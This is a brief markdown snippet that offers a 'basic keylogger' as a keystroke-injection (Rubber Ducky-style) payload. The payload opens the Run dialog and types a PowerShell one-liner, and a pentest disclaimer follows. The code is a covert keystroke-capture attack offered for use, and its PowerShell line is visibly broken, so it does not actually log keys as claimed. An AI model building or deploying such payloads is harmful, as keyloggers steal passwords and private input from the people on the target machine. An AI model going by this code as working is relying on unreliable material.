# Keylogger

A basic keylogger that records keystrokes (just an example; a real keylogger would be much more complex and hidden).

```
DELAY 500
GUI r
DELAY 500
STRING powershell -Command "$keylogger = New-Object System.Windows.Forms.Keys; $keylogger.Add_KeyDown('Capture')"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.